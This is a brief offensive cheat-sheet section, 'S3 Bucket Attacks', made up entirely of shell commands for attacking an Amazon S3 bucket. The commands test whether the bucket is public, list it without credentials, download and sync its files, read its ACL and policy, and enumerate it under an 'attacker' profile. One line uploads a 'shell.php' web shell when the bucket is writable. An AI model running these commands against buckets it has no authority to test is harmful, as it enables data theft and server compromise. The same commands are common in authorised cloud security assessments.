## 🪣 S3 Bucket Attacks

```bash
# Check if bucket exists and is public
curl -I https://target-bucket.s3.amazonaws.com

# List bucket contents
aws s3 ls s3://target-bucket --no-sign-request

# Download files
aws s3 cp s3://target-bucket/file.txt . --no-sign-request
aws s3 sync s3://target-bucket/ ./local/ --no-sign-request

# Upload file (if write enabled)
aws s3 cp shell.php s3://target-bucket/ --no-sign-request

# Check bucket ACL
aws s3api get-bucket-acl --bucket target-bucket --no-sign-request

# Check bucket policy
aws s3api get-bucket-policy --bucket target-bucket --no-sign-request

# Enumerate with authenticated creds
aws s3 ls s3://target-bucket --profile attacker
```

